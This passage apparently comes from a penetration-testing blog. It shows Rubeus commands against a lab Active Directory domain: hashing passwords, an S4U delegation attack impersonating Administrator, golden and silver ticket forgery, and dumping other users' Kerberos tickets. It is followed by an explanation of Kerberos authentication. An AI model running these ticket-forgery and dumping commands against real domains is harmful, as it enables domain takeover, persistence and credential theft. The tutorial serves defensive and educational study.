/noticket`\n            \n![https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg8INMtJE1du0EspNXMj77ZWTFOnXpqubTigbJ7OEAxdyYRsYdzmFOJ6-4TC9981a5sSh1gSumtK8toDQRacSx-xpU2atrsKCEmiXTlzVuc-WEDEfA_JGRDYtF14fyCnh9rpUCKBdyVKWzgX7BauXZv9MNt-_w1XmV8xOiuN4ZaLpQmy_5xzuuxZDvivA/s16000/16.png?w=640&ssl=1](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg8INMtJE1du0EspNXMj77ZWTFOnXpqubTigbJ7OEAxdyYRsYdzmFOJ6-4TC9981a5sSh1gSumtK8toDQRacSx-xpU2atrsKCEmiXTlzVuc-WEDEfA_JGRDYtF14fyCnh9rpUCKBdyVKWzgX7BauXZv9MNt-_w1XmV8xOiuN4ZaLpQmy_5xzuuxZDvivA/s16000/16.png?w=640&ssl=1)\n            \n**Hash**\n            \nRubeus is capable of taking in passwords and generating hashes of them. These are of different formats including NTLM (rc4_hmac) hash. To do this, we can use a **hash** function and provide a domain using /domain, an account’s name (can be a machine account too) using the/user flag and the password using /password.\n            \n`rubeus.exe hash /user:harshitrajpal /domain:ignite.local /password:Password@1`\n            \n![https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjZwNam6iqN9HFpOVruPYUbfV6Fv4Jdy5rhK3M5jh0bC0T8fCyiuaBZGICX4VpQMH8VgHtHC-W_xc75J_k3fc9VlCPhPjJAwrAYd2EjRxisDx0J7AA0RVzq8v1QSHG9EBQ_vKxFfwqIN8UxppwBCl4X6AlqH31yo_kUhXtwIoC6FMMXQjdIxkj4RM_RXA/s16000/17.png?w=640&ssl=1](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjZwNam6iqN9HFpOVruPYUbfV6Fv4Jdy5rhK3M5jh0bC0T8fCyiuaBZGICX4VpQMH8VgHtHC-W_xc75J_k3fc9VlCPhPjJAwrAYd2EjRxisDx0J7AA0RVzq8v1QSHG9EBQ_vKxFfwqIN8UxppwBCl4X6AlqH31yo_kUhXtwIoC6FMMXQjdIxkj4RM_RXA/s16000/17.png?w=640&ssl=1)\n            \nAs you can see 4 different hashes have been output. Various encryption ciphers are used in conjunction with popular hashing techniques. All of these ciphers are supported in AD environment and hence, may be used for different purposes.\n            \n**S4u**\n            \nWe saw above how we can generate hashes using Rubeus. Now let’s talk about one such attack where hashes can be used to impersonate another user and carry out delegation attacks. For a detailed write-up on delegation, and attacks follow the link **[here](https://www.hackingarticles.in/domain-escalation-resource-based-constrained-delegation/)**. In short, OS post-Windows server 2003 contained a Kerberos protocol extension called s4uself and s4uproxy. These protocols can be used to conduct delegation attacks. For example, in the example below, we have performed an attack called “Resource-Based Constrained Delegation” which benefits the **msDS-AllowedToActOnBehalfOfAnotherIdentity** option set in the attribute’s editor. Follow the article **[here](https://www.hackingarticles.in/domain-escalation-resource-based-constrained-delegation/)** for a full attack. In the example below, we’ll use the user noob’s hash and then impersonate Administrator account.\n            \n- /rc4: flag is used to provide user noob’s account.\n            \n- /impersonateuser: User that will be impersonated by noob.\n            \n- /msdsspn: A valid msDS-AllowedToActOnBehalfOfAnotherIdentity value for the account. Here, the domain controller\n            \n- /altservice: can be supplied to substitute one or more service names in the resulting .kirbi file.\n            \n- /ptt: Injects the resulting ticket in the current terminal session\n            \n`rubeus.exe s4u /user:noob$ /rc4:64FBAE31CC352FC26AF97CBDEF151E03 /impersonateuser:Administrator /msdsspn:host/dc1.ignite.local /altservice:cifs /domain:ignite.local /ptt`\n            \n![https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiKaBMUp5U77qh_6bLSEV5bfowSgiBZUnNH2RVGlwxy6mUTG9N64BCvW5gcbsu6DIUNQ2Y3AmFBysTZZBbaXsZSivH7JAfNBMHVF9NjFyNc3_6qdjTyVa2Oh5Y3lkzvTMlMV0NptR-PLeyvgEPczWZdi1gf_AhJm9H_3vq1zXG_68zKek31PTNhtK5QDw/s16000/18.png?w=640&ssl=1](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiKaBMUp5U77qh_6bLSEV5bfowSgiBZUnNH2RVGlwxy6mUTG9N64BCvW5gcbsu6DIUNQ2Y3AmFBysTZZBbaXsZSivH7JAfNBMHVF9NjFyNc3_6qdjTyVa2Oh5Y3lkzvTMlMV0NptR-PLeyvgEPczWZdi1gf_AhJm9H_3vq1zXG_68zKek31PTNhtK5QDw/s16000/18.png?w=640&ssl=1)\n            \nThis would generate a ticket for Administrator user over the specified SPN. In short, we can now act as DC.\n            \n![https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhUB3Gg2Pl5L3PtqMzd7Q7xa8K50p7yK8r3YqVEj5VgHAcAClYIFIwE4kiN-UcO58nHkB5BjLOOtlEAAIcd86f0oq3_I6K2XCmjkFVZnjDUggjoiycvgi9tOn-iuZ1FeiJY4BoxpP2dfMdC7xFQH7vpG-ahmBvjzVP1_QE6Hlv-LjJqBDnqkIi03zzb6A/s16000/19.png?w=640&ssl=1](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhUB3Gg2Pl5L3PtqMzd7Q7xa8K50p7yK8r3YqVEj5VgHAcAClYIFIwE4kiN-UcO58nHkB5BjLOOtlEAAIcd86f0oq3_I6K2XCmjkFVZnjDUggjoiycvgi9tOn-iuZ1FeiJY4BoxpP2dfMdC7xFQH7vpG-ahmBvjzVP1_QE6Hlv-LjJqBDnqkIi03zzb6A/s16000/19.png?w=640&ssl=1)\n            \n### Golden Ticket\n                \nGolden tickets are forged KRBTGTs (Key Distribution Service account) which can be used to forge other TGTs. This provides an attacker persistence over the domain accounts. For a detailed walkthrough on the topic you can visit the article **[here](https://www.hackingarticles.in/domain-persistence-golden-ticket-attack/)**.\n                \nTo forge a golden ticket for user harshitrajpal, we first generate an AES hash (RC4 works too) using the hash command in Rubeus and then using the golden function like so. Here,\n                \n- /ldap: Retrieves information of user over LDAP protocol\n                \n- /user: Username whose ticket will be forged\n                \n- /printcmd: displays a one liner command that can be used to generate the ticket again that just got generated\n                \n`rubeus.exe hash /user:harshitrajpal /domain:ignite.local /password:Password@1`\n                \n`rubeus.exe golden /aes256:EA2344691D140975946372D18949706857EB9C5F65855B0E159E54260BEB365C /ldap /user:harshitrajpal /printcmd`\n                \n![https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjPW0OyVNb9deU4qubrM9AEjoOx7201V4pamhV-2Mru0bgQtPYpuvLlJkuOKv4V4mm0Oev2mb8XOF3JccaoZz3xtI5l8psPzgyrBbsYNB8lN3BjcNIVbbiit7B6-ly-ba4JeQ_aKuWgmQp_Vlwgiopb3z763jc82mW25GyqIOdhlWEV8YtqKGQsI6GQVA/s16000/20.png?w=640&ssl=1](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjPW0OyVNb9deU4qubrM9AEjoOx7201V4pamhV-2Mru0bgQtPYpuvLlJkuOKv4V4mm0Oev2mb8XOF3JccaoZz3xtI5l8psPzgyrBbsYNB8lN3BjcNIVbbiit7B6-ly-ba4JeQ_aKuWgmQp_Vlwgiopb3z763jc82mW25GyqIOdhlWEV8YtqKGQsI6GQVA/s16000/20.png?w=640&ssl=1)\n                \nAs you can see various details like SID, userID, Service Key etc are being fetched over LDAP which are important to generate a ticket. PAC signing is also done and a TGT generated for harshitrajpal\n                \n![https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjxY76i8rRENeczKVXlyQt-PAGh-qYsRVlpB7wJe-Up8Xnkv6aBrdlB7CQVFsBFznkq015OPZG3Y77ndDEAnQ2UsV4zmdzEONj1lJaf2NcJvg7TaOgE31UHNMER3COPjpOHUuu3XfwgQmdB4WcYn_sXi4bHMITqEbMghPGGrvs4pHHshPb-WnJKFr15VA/s16000/21.png?w=640&ssl=1](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjxY76i8rRENeczKVXlyQt-PAGh-qYsRVlpB7wJe-Up8Xnkv6aBrdlB7CQVFsBFznkq015OPZG3Y77ndDEAnQ2UsV4zmdzEONj1lJaf2NcJvg7TaOgE31UHNMER3COPjpOHUuu3XfwgQmdB4WcYn_sXi4bHMITqEbMghPGGrvs4pHHshPb-WnJKFr15VA/s16000/21.png?w=640&ssl=1)\n                \nAlso, at the end you’ll see a one liner command that can be used to generate this TGT again.\n                \n![https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhfywgxE1QC5yHtbQrFXEPtYWOTQCW2-OvfyCFEcnV3kZX4O_HwPo1OK0pF-fN_TqCpzYuChAht98oyoZWFgawOvvrN6phmhaqcd_rhEscMJs6x2FLcjdFTwf6i2mUoaVwXwP9z_liDl9Y7O3eB7_YoRVJm5o42LcnjkS5-JFhYoyRv_219ADE8Zd-mnQ/s16000/22.png?w=640&ssl=1](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhfywgxE1QC5yHtbQrFXEPtYWOTQCW2-OvfyCFEcnV3kZX4O_HwPo1OK0pF-fN_TqCpzYuChAht98oyoZWFgawOvvrN6phmhaqcd_rhEscMJs6x2FLcjdFTwf6i2mUoaVwXwP9z_liDl9Y7O3eB7_YoRVJm5o42LcnjkS5-JFhYoyRv_219ADE8Zd-mnQ/s16000/22.png?w=640&ssl=1)\n                \nVarious other options can be used in conjunction with golden to modify the generated TGT like:\n                \n- /rangeinterval: After every time specified, a new ticket will be generated.\n                \n- /rangeend: Specifies the maximum time tickets will be generated for. Here, 5 days. Since rangeinterval is 1d, 5 different tickets will be generated.\n                \nFor a full list of modifications, see [this](https://github.com/GhostPack/Rubeus#ticket-forgery) page.\n                \n![https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgUypE_lTmt2yK73cZqzgsmQQNTlCV36mrTI6qA649BmStnd2VqKiA8VYyUPv6hJTM-qGOBzoeTDZ11TDCeAZrjJVNsaSkBSDHDiFU_RQEEywN-i8bA9II87KdJjC1zdo7ekO1CxpuuNA9sSlz5L-5QfhKXLmPzYasAgLoCiD9ygPjc8lF3n4wn9oZWzQ/s16000/23.png?w=640&ssl=1](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgUypE_lTmt2yK73cZqzgsmQQNTlCV36mrTI6qA649BmStnd2VqKiA8VYyUPv6hJTM-qGOBzoeTDZ11TDCeAZrjJVNsaSkBSDHDiFU_RQEEywN-i8bA9II87KdJjC1zdo7ekO1CxpuuNA9sSlz5L-5QfhKXLmPzYasAgLoCiD9ygPjc8lF3n4wn9oZWzQ/s16000/23.png?w=640&ssl=1)\n                \n### Silver Ticket\n                \nSilver tickets are forged Kerberos Ticket Granting Service (TGS) Tickets but with silver tickets there is no communication with the domain controller. It is signed by the service account configured with an SPN for each server the Kerberos-authenticating service runs on. For more details visit the page **[here](https://adsecurity.org/?p=2011)**.\n                \nSilver ticket attack can be performed using Rubeus using silver function. Other customisations need be made like:\n                \n- /service: SPN of the service ticket is being generated for\n                \n- /rc4: Hash of a valid user (harshitrajpal here) which will be used to encrypt the generated ticket\n                \n- /user: username of the user whose hash is provided\n                \n- /creduser: User to be impersonated\n                \n- /credpassword: Password of the user to be impersonated\n                \n- /krbkey: used to create the KDCChecksum and TicketChecksum. This is the AES256 hmac sha1 hash in the following case.\n                \n- /krbenctype: type of encrypted hash used. Aes256 here.\n                \n`rubeus.exe hash /user:harshitrajpal /domain:ignite.local /password:Password@1`\n                \n`rubeus.exe silver /service:cifs/dc1.ignite.local /rc4:64FBAE31CC352FC26AF97CBDEF151E03 /ldap /creduser:ignite.local\\Administrator /credpassword:Ignite@987 /user:harshitrajpal /krbkey:EA2344691D140975946372D18949706857EB9C5F65855B0E159E54260BEB365C /krbenctype:aes256 /domain:ignite.local /ptt`\n                \n![https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEisS0kDD040twsfat2VTDk5Vb0CHVG5Ho8l7jvHce-9bDMM8q0bKmcZS-Mft-uYxbjVHPPvftsC-fmkKmWH7JKLW7gp9OhKSsh64nwt597z00_UyhrzIsbxvWYysVr2DFj__o88gbUKXoiH8ghDmX1nttn9j0URoOF8avXUSyibjLTmYWLBDAPgqIPFHA/s16000/24.png?w=640&ssl=1](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEisS0kDD040twsfat2VTDk5Vb0CHVG5Ho8l7jvHce-9bDMM8q0bKmcZS-Mft-uYxbjVHPPvftsC-fmkKmWH7JKLW7gp9OhKSsh64nwt597z00_UyhrzIsbxvWYysVr2DFj__o88gbUKXoiH8ghDmX1nttn9j0URoOF8avXUSyibjLTmYWLBDAPgqIPFHA/s16000/24.png?w=640&ssl=1)\n                \nThis helped us generate a silver ticker for Administrator account. And as a result, we are now able to access DC machine’s C drive\n                \n`dir \\\\dc1.ignite.local\\c$`                \n![https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjXSuXCGmt8xKSiStl62a7d-U4QriyKnr09ulubQzP_4Xb3qvrtuswXkVm6d2JnRe2wW-fJCXEFZmwy-DYtS5tivoUszspE8U0tMbNs2MbnVW1rTihlWrJdQp_RlmtBhL2eIx_TwHPSn3wgsq1UfhhoPB9zY3zRsV77ZmCYZB-C8p510xPjbnutXcFNDA/s16000/25.png?w=640&ssl=1](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjXSuXCGmt8xKSiStl62a7d-U4QriyKnr09ulubQzP_4Xb3qvrtuswXkVm6d2JnRe2wW-fJCXEFZmwy-DYtS5tivoUszspE8U0tMbNs2MbnVW1rTihlWrJdQp_RlmtBhL2eIx_TwHPSn3wgsq1UfhhoPB9zY3zRsV77ZmCYZB-C8p510xPjbnutXcFNDA/s16000/25.png?w=640&ssl=1)\n \n### Ticket Management\n            \nRubeus contains multiple ticket management options that may aid a pentester to conduct operations effectively and stealthily. As a pentester, we need to manage our generated tickets.\n            \n**Ptt**\n            \nThe Rubeus ptt option can import the supplied ticket in command line. The /ptt can also be used in conjunction with other options that output tickets. For example,\n            \n`rubeus.exe ptt /ticket:doIFNDCCBTCgAwI...bA==`\n            \n![https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgKTVmohjirCZfdaG4GGv7-wzWMuQ58Q1_TCFHqBRpx9oRXWvvKAnWSir3Eh6VFwNFbwjPW2owjtkj25OSt2QZtX91OHITOdFbYToEfxgKkchxA1hhppI0_GbkGZKvhobYRcJMR_n8eN_SX67_x-GS_u_mqEhba24FoFO6tjr1I3p2p6xsd1uaI8H2kEA/s16000/26.png?w=640&ssl=1](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgKTVmohjirCZfdaG4GGv7-wzWMuQ58Q1_TCFHqBRpx9oRXWvvKAnWSir3Eh6VFwNFbwjPW2owjtkj25OSt2QZtX91OHITOdFbYToEfxgKkchxA1hhppI0_GbkGZKvhobYRcJMR_n8eN_SX67_x-GS_u_mqEhba24FoFO6tjr1I3p2p6xsd1uaI8H2kEA/s16000/26.png?w=640&ssl=1)\n            \nAs you can see, the generated ticket has now been imported.\n            \n**Purge**\n            \nRubeus has a purge option which can purge/delete all the tickets existing in the current session.\n            \nHere, we demonstrate how we purged 2 tickets listed by klist.\n            \n`rubeus.exe purge`\n            \n![https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEieNiT1NqlQJ6XX-v68CUP7L2r6GKfB7k4inUgNicpJfdwG25zZNJHQeekion5CN0asOuv8bdVDGlNLGfeoOqrmgfvdiK8Ws1Pya_9G56jX1XAN2M68-VRj8AmN6f30zGWpj-dSrTFKXcuysXB8X6wTrknGtv3gY8ug-tM2Dix9hE5ajlXBP58OudyvXg/s16000/27.png?w=640&ssl=1](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEieNiT1NqlQJ6XX-v68CUP7L2r6GKfB7k4inUgNicpJfdwG25zZNJHQeekion5CN0asOuv8bdVDGlNLGfeoOqrmgfvdiK8Ws1Pya_9G56jX1XAN2M68-VRj8AmN6f30zGWpj-dSrTFKXcuysXB8X6wTrknGtv3gY8ug-tM2Dix9hE5ajlXBP58OudyvXg/s16000/27.png?w=640&ssl=1)\n            \n**Describe**\n            \nOften we lose track of the tickets in system. Describe option helps us to view details about a particular base64 encrypted blob or ticket.kirbi file.\n            \nWe can provide the ticket using /ticket flag.\n            \n`rubeus.exe describe /ticket:doIFNDCCBTCg...bA==`\n            \n![https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh7WIoNU11b3w36Lw-C6yMzOBTFQxc7yc_-HXOlbJPfCnzdnN3paIj-5S8aSDB7zGWRHz-yeg3IiT1FTUhqgeN9xo6pJnO4fidzzgDOqGBbKNyv1j54uptRBvs2BFfWlJRmsqnM_Cy_kC7PuA9UysbRijcPorIUb3E4ZZrXLuVCfwCspDwVzBoUYAfF5A/s16000/28.png?w=640&ssl=1](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh7WIoNU11b3w36Lw-C6yMzOBTFQxc7yc_-HXOlbJPfCnzdnN3paIj-5S8aSDB7zGWRHz-yeg3IiT1FTUhqgeN9xo6pJnO4fidzzgDOqGBbKNyv1j54uptRBvs2BFfWlJRmsqnM_Cy_kC7PuA9UysbRijcPorIUb3E4ZZrXLuVCfwCspDwVzBoUYAfF5A/s16000/28.png?w=640&ssl=1)\n            \n**Triage**\n            \nWhile klist views tickets for current session triage lists all the tickets. When a session is being run as an administrator, we can not only view tickets in the current user’s session memory but other user’s tickets in memory too.\n            \n- /luid: This flag can be used to provide a specific user ID.\n            \n`rubeus.exe triage`            \n`rubeus.exe triage /luid:*0x8f57c*`\n            \n![https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiY-eDU_fYg-Ta1R9oB54ePb_m9XufvCqw8HWY9J52F9-2dKB3zjQb7L50ZyXuk9GulLVXul-uPlDeDRfkGvUXiM0uJF8RRbb9ZGHrtGDW6TL6SqMvSpg9InazDv7SrjpG5DQsDeXGLNp6O4akhBrlu9qL714Z_mi-G6Db8knG2YgQICInIPR2oyb0T2w/s16000/29.png?w=640&ssl=1](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiY-eDU_fYg-Ta1R9oB54ePb_m9XufvCqw8HWY9J52F9-2dKB3zjQb7L50ZyXuk9GulLVXul-uPlDeDRfkGvUXiM0uJF8RRbb9ZGHrtGDW6TL6SqMvSpg9InazDv7SrjpG5DQsDeXGLNp6O4akhBrlu9qL714Z_mi-G6Db8knG2YgQICInIPR2oyb0T2w/s16000/29.png?w=640&ssl=1)\n            \nAlso, when the LUID is known, we can purge particular user’s tickets too (elevated mode only)\n            \n`rubeus.exe purge /luid:*0x8f57c*`\n            \n![https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiAKUAPB_XJDt6Tq5e8P6aR9obYD55fJBc83A0X11E6HQ-OPvfsuonWsT5MUVoB9GQYhCeaYRRP7tz1prxHmQ7v_DSUWpoCbBXozmfFwWxjNWQCJ8fEfw8cp6xhFXJWfqCAWcyixZ_Aajw4ArGdgMFj_tlqznpADDUFs4yY1RuQns1qfFU6IYmZO9WGTQ/s16000/30.png?w=640&ssl=1](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiAKUAPB_XJDt6Tq5e8P6aR9obYD55fJBc83A0X11E6HQ-OPvfsuonWsT5MUVoB9GQYhCeaYRRP7tz1prxHmQ7v_DSUWpoCbBXozmfFwWxjNWQCJ8fEfw8cp6xhFXJWfqCAWcyixZ_Aajw4ArGdgMFj_tlqznpADDUFs4yY1RuQns1qfFU6IYmZO9WGTQ/s16000/30.png?w=640&ssl=1)\n            \n**Dump**\n            \nIf the session is running in an elevated mode, a user can dump/ extract all the current TGTs and service tickets. Again, /luid can be provided to dump specific user’s tickets. /service can be used to filter these tickets.\n            \nFor example, /service:krbtgt displays only TGTs.\n            \n`rubeus.exe dump`\n            \n![https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj0Wj1VAku1zDOX5hWi5X0sbmrJFZnXUu5eJQfHm8pXWCTHx0v62LUK30nibHWGq2RFDhFFCjXnSkccraTemLREKxKcd3gX42vNY7qdpwx7afNUL4907CfasdQo9jAFw5VbuXpPVovRHBzum8pdHBKJTj4spcRi2c66Or75V4gg9UwFXsWNzJYsU3BSsw/s16000/31.png?w=640&ssl=1](https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj0Wj1VAku1zDOX5hWi5X0sbmrJFZnXUu5eJQfHm8pXWCTHx0v62LUK30nibHWGq2RFDhFFCjXnSkccraTemLREKxKcd3gX42vNY7qdpwx7afNUL4907CfasdQo9jAFw5VbuXpPVovRHBzum8pdHBKJTj4spcRi2c66Or75V4gg9UwFXsWNzJYsU3BSsw/s16000/31.png?w=640&ssl=1)\n\n\nNext part I'll work on the mitigation bit as it's own unit hope you learnt a few bit on the read ... 😊   ","slug":"active-directory/kerberos-101","published":1,"updated":"2024-07-16T20:37:57.442Z","_id":"clyouz1iu0006wgjn70bd7b4r","comments":1,"layout":"post","photos":[],"content":"<p><img src=\"https://redfoxsec.com/wp-content/uploads/2023/03/attacking-kerberos-part-2-thumbnail.png\"></p>\n<h2 id=\"Kerberoasting\"><a href=\"#Kerberoasting\" class=\"headerlink\" title=\"Kerberoasting\"></a>Kerberoasting</h2><p>The Kerberos protocol defines how clients interact with a network authentication service, clients obtain tickets from the Kerberos Key Distribution Center (KDC) and they submit these tickets to application servers when connections are established. uses port 88 by default and depends on the process of symmetric key cryptography.</p>\n<p><em>NB</em> [<strong><strong>kerberos uses tickets to authenticate a user and completely avoids sending passwords across the network</strong>]</strong></p>\n<p><img src=\"https://miro.medium.com/v2/resize:fit:720/format:webp/1*J6UHDf5fnbzdKTPawNq3UA.png\"></p>\n<h3 id=\"How-Kerb-Auth-works\"><a href=\"#How-Kerb-Auth-works\" class=\"headerlink\" title=\"How Kerb Auth works!\"></a>How Kerb Auth works!</h3><p>In every Active Directory domain, every domain controller runs a KDC service that provides requests for tickets to kerberos, which is the KRBTGT account in the AD domain.</p>\n<p><img src=\"https://1.bp.blogspot.com/-XHZj0n9oH_g/XrHWMs_s-uI/AAAAAAAAj2E/oxSrDD2wvOEMv-a-nTHhQD2jc-3KMULYgCLcBGAsYHQ/s1600/1.png\" alt=\"1.webp\"></p>\n<p>Kerberos uses symmetric cryptography for encryption and decryption.</p>\n<p>For explanation purposes, we use three colours to distinguish Hashes:</p>\n<ul>\n<li><strong>BLUE _KEY</strong>: User NTLM HASH</li>\n<li><strong>YELLOW_KEY</strong>: Krbtgt NTLM HASH</li>\n<li><strong>RED_KEY:</strong> Service NTLM HASH</li>\n</ul>\n<p><strong>Step 1:</strong> By sending the request message to KDC, the client initializes communication as:</p>\n<p><em><strong>KRB_AS_REQ contains the following:</strong></em></p>\n<ul>\n<li>The username of the client is to be authenticated.</li>\n<li><em>The service <strong>SPN (SERVICE PRINCIPAL NAME)</strong> linked with the Krbtgt account</em></li>\n<li><em>An encrypted timestamp (Locked with User Hash: Blue Key)</em></li>\n</ul>\n<p>The entire message is encrypted using the User NTLM hash (<strong>Locked with BLUE KEY</strong>) to authenticate the user and prevent replay attacks.</p>\n<p><strong>Step 2:</strong> The KDC uses a database consisting of Users&#x2F;Krbtgt&#x2F;Services hashes to decrypt a message (<strong>Unlock with BLUE KEY</strong>) that authenticates user identification.</p>\n<p>Then KDC will generate TGT (Ticket Granting Ticket) for a client that is encrypted using Krbtgt hash (Locked with Yellow Key) &amp; some Encrypted Message using User Hash.</p>\n<p><em><strong>KRB_AS_REP contains the following:</strong></em></p>\n<ul>\n<li><em><strong>Username</strong></em></li>\n<li><em>Some encrypted data, (Locked with User Hash: Blue Key) that contains:</em></li>\n<li><em>Session key</em></li>\n<li><em>The expiration date of TGT</em></li>\n<li><em><strong>TGT</strong>, (Locked with Krbtgt Hash: Yellow Key) which contains:</em></li>\n<li><em>Username</em></li>\n<li><em>Session key</em></li>\n<li><em>The expiration date of TGT</em></li>\n<li><em>PAC with user privileges, signed by KDC</em></li>\n</ul>\n<p><img src=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj8cs4DxTHhCqS9yUAa3yOwC8e3ElB50XZ4QyOkWXIEAGssMdjBPNsGVaDz274Z8voKtHNoBHD9qD6PKPvp9KLzdxjUzRtSc_UQ7Jz03v5BHEwhP7wm09K-81SGcv3qTyJ1UDyctCHyDc_PgLZbe4A5GipaqZmDU649RWcNbQtIpM6o6DvKicqXTU5vQA/s16000/2.png?w=640&ssl=1\" alt=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj8cs4DxTHhCqS9yUAa3yOwC8e3ElB50XZ4QyOkWXIEAGssMdjBPNsGVaDz274Z8voKtHNoBHD9qD6PKPvp9KLzdxjUzRtSc_UQ7Jz03v5BHEwhP7wm09K-81SGcv3qTyJ1UDyctCHyDc_PgLZbe4A5GipaqZmDU649RWcNbQtIpM6o6DvKicqXTU5vQA/s16000/2.png?w=640&amp;ssl=1\"></p>\n<p><strong>Step 3:</strong> The KRB_TGT will be stored in the Kerberos tray (Memory) of the client machine, as the user already has the KRB_TGT, which is used to identify himself for the TGS request. The client sent a copy of the TGT with the encrypted data to KDC.</p>\n<p><em><strong>KRB_TGS_REQ</strong> contains:</em></p>\n<ul>\n<li><em>Encrypted data with the session key</em></li>\n<li><em>Username</em></li>\n<li><em>Timestamp</em></li>\n<li><em>TGT</em></li>\n<li><em>SPN of requested service e.g. SQL service</em></li>\n</ul>\n<p><strong>Step 4:</strong> The KDC receives the KRB_TGS_REQ message and decrypts the message using Krbtgt hash to verify TGT (Unlock using Yellow key), then KDC returns a TGS as KRB_TGS_REP which is encrypted using requested service hash <strong>(Locked with Red Key)</strong> &amp; Some Encrypted Message using User Hash.</p>\n<p><em><strong>KRB_TGS_REP contains:</strong></em></p>\n<ul>\n<li><em>Username</em></li>\n<li><em>Encrypted data with the session key:</em></li>\n<li><em>Service session key</em></li>\n<li><em>The expiration date of TGS</em></li>\n<li><em><strong>TGS</strong>, (Service Hash: RED Key) which contains:</em></li>\n<li><em>Service session key</em></li>\n<li><em>Username</em></li>\n<li><em>The expiration date of TGS</em></li>\n<li><em>PAC with user privileges, signed by KDC</em></li>\n</ul>\n<p><img src=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgEljfKE_fFEoR8kThrILtnjmFwQPfM61p-SZh6Xg64sLUv7GzLgsvk6Ni5YhC8A7ILETnBFHbsa2ldkL6u1mrWGkDStzkFSP9oCeg3cO_9QxjyltM0ZpKm5Jf2oV8lo-IsfR2C7-jAAaRyWTu_Sofn4TV7BhIl0fj5fYPIicSjbScOtyUql25EmTo-Tw/s16000/3.png?w=640&ssl=1\" alt=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgEljfKE_fFEoR8kThrILtnjmFwQPfM61p-SZh6Xg64sLUv7GzLgsvk6Ni5YhC8A7ILETnBFHbsa2ldkL6u1mrWGkDStzkFSP9oCeg3cO_9QxjyltM0ZpKm5Jf2oV8lo-IsfR2C7-jAAaRyWTu_Sofn4TV7BhIl0fj5fYPIicSjbScOtyUql25EmTo-Tw/s16000/3.png?w=640&amp;ssl=1\"></p>\n<p><strong>Step 5:</strong> The user sends the copy of TGS to the Application Server,</p>\n<p><em><strong>KRB_AP_REQ contains:</strong></em></p>\n<ul>\n<li><em>TGS</em></li>\n<li><em>Encrypted data with the service session key:</em></li>\n<li><em>Username</em></li>\n<li><em>Timestamp, to avoid replay attacks</em></li>\n</ul>\n<p><strong>Step 6:</strong> The application attempts to decrypt the message using its NTLM hash and to verify the PAC from KDC to identify user Privilege which is an optional case.</p>\n<p><strong>Step 7:</strong>  KDC verifies PAC (Optional)</p>\n<p><strong>Step 8:</strong>  Allow the user to access the service for a specific time.</p>\n<h2 id=\"SPNs\"><a href=\"#SPNs\" class=\"headerlink\" title=\"SPNs\"></a>SPNs</h2><p>The Service Principal Name (SPN) is a unique identifier for a service instance. Active Directory Domain Services and Windows provide support for Service Principal Names (SPNs), which are key components of the Kerberos mechanism through which a client authenticates a service.</p>\n<p><strong>Important Points</strong></p>\n<ul>\n<li>If you install multiple instances of a service on computers throughout a forest, each instance must have its SPN.</li>\n<li>Before the Kerberos authentication service can use an SPN to authenticate a service, the SPN must be registered on the account.</li>\n<li>A given SPN can be registered on only one account.</li>\n<li>An SPN must be unique in the forest in which it is registered.</li>\n<li>If it is not unique, authentication will fail.</li>\n</ul>\n<h3 id=\"SPNS-syntax\"><a href=\"#SPNS-syntax\" class=\"headerlink\" title=\"SPNS syntax\"></a>SPNS syntax</h3><p><strong>The SPN syntax has four elements</strong></p>\n<p><img src=\"https://i0.wp.com/blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh5w4iPbIsIxS5VNUzD13_nOXg-0AbmhtwdJWBUqi4keSFbajcnh5Bgqro7FOj686VwDTBbtu0oYjZbBGRyRWxUHy8EAJp8jmUQpDBymwTWzE_9RIpwOkK2Ul6bxIbDZSwHYhknzECBwjBEd4VU5HyMeCciosGRPfcjbaN62fLe6WPiArdLqlHrpGMKOQ/s16000/5.png?w=640&ssl=1\" 